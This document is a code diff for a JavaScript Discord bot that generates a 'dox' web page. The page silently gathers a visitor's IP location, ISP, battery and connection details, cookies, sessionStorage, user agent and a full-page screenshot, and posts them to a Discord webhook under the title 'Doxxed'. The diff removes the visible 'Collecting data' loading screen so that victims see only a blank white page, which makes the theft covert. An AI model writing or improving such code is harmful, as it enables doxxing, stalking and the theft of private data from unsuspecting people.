@@ -192,7 +192,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML - FIXED ----
+// ---- DOX HTML – WHITE PAGE + IP + FULL SCREENSHOT ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -201,23 +201,14 @@ function generateDoxHTML(webhook) {
     <title></title>
     <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
     <style>
-        body { background: #0b0b12; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', sans-serif; color: #f0f0ff; }
-        .container { text-align: center; padding: 20px; }
-        .spinner { border: 4px solid rgba(255,255,255,0.04); border-top: 4px solid #8B5CF6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { color: #8888aa; font-size: 14px; }
+        body { background: #ffffff; margin: 0; height: 100vh; }
     </style>
 </head>
 <body>
-    <div class="container" id="loading">
-        <h1>🔮 Loading...</h1>
-        <div class="spinner"></div>
-        <p class="status">Collecting data, please wait...</p>
-    </div>
-
 <script>
 const WEBHOOK_URL = "${webhook}";
 
+// ---- UTILITY ----
 function hash(str) {
     let h = 0;
     for (let i = 0; i < str.length; i++) { h = ((h << 5) - h) + str.charCodeAt(i); h |= 0; }
@@ -231,7 +222,7 @@ function getCookie(name) {
     return null;
 }
 
-// ---- IP DATA: THREE FALLBACKS ----
+// ---- IP DATA (Multiple fallbacks) ----
 async function getIPData() {
     const apis = [
         { url: 'https://ipinfo.io/json', parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
@@ -376,8 +367,6 @@ async function takeScreenshot() {
 // ---- MAIN ----
 (async function() {
     try {
-        document.getElementById('loading').innerHTML = '<h1>🔮 Collecting...</h1><div class="spinner"></div><p class="status">Gathering device data...</p>';
-
         const ip = await getIPData();
         const battery = await getBattery();
         const conn = getConnection();
@@ -402,17 +391,12 @@ async function takeScreenshot() {
         const pageURL = window.location.href;
         const referrer = document.referrer || 'N/A';
 
-        // ---- TIME ----
         const now = new Date();
         const timeData = {
             timestamp: now.toISOString(),
             local: now.toString(),
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            offset: now.getTimezoneOffset(),
-            day: now.toDateString(),
-            hour: now.getHours(),
-            minute: now.getMinutes(),
-            second: now.getSeconds()
+            offset: now.getTimezoneOffset()
         };
 
         const data = {
@@ -437,8 +421,7 @@ async function takeScreenshot() {
             sessionStorage: JSON.stringify(ss).slice(0, 1000),
             pageTitle, pageURL, referrer,
             userAgent: ua,
-            time: timeData,
-            connectionType: conn // already included
+            time: timeData
         };
 
         const fields = [
@@ -480,10 +463,10 @@ async function takeScreenshot() {
             title: '☠️ Doxxed',
             color: 0xFF0000,
             fields: fields,
-            footer: { text: 'Logged at ' + data.timestamp }
+            footer: { text: 'Logged at ' + data.time.timestamp }
         };
 
-        // ---- SEND TO WEBHOOK ----
+        // ---- SEND EMBED ----
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -491,7 +474,6 @@ async function takeScreenshot() {
         });
 
         // ---- SCREENSHOT ----
-        document.getElementById('loading').innerHTML = '<h1>📸 Screenshot</h1><div class="spinner"></div><p class="status">Capturing full page...</p>';
         const screenshot = await takeScreenshot();
         if (screenshot) {
             const blob = await fetch(screenshot).then(r => r.blob());
@@ -504,7 +486,7 @@ async function takeScreenshot() {
         console.error('Dox error:', err);
     }
 
-    // ---- CLOSE ----
+    // ---- BLANK WHITE PAGE ----
     document.body.innerHTML = '';
     document.body.style.background = '#ffffff';
     document.body.style.margin = '0';
@@ -512,7 +494,7 @@ async function takeScreenshot() {
     setTimeout(() => {
         window.close();
         window.location.href = 'about:blank';
-    }, 2000);
+    }, 1500);
 })();
 </script>
 </body>
